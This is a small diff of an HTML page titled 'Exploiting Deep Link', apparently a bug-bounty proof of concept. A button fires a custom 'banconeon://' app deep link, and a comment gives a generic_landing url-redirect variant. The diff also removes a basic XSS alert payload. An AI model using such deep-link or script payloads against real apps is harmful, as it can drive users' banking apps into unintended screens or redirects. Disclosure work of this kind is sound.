@@ -1,3 +1,17 @@
 <html>
-<script>alert('xss');</script>
+    <head>
+        <title>Exploiting Deep Link</title>
+    </head>
+    <script>
+        var deeplink = function() {
+	        window.location.replace("banconeon:// cmp=com.duolingo");
+
+            /* banconeon://generic_landing?url=https://hackerone.com */
+        };
+    </script>
+    <body>
+        <h1>
+            <button onclick="deeplink()"> Click Here! </button>
+        </h1>
+    </body>
 </html>
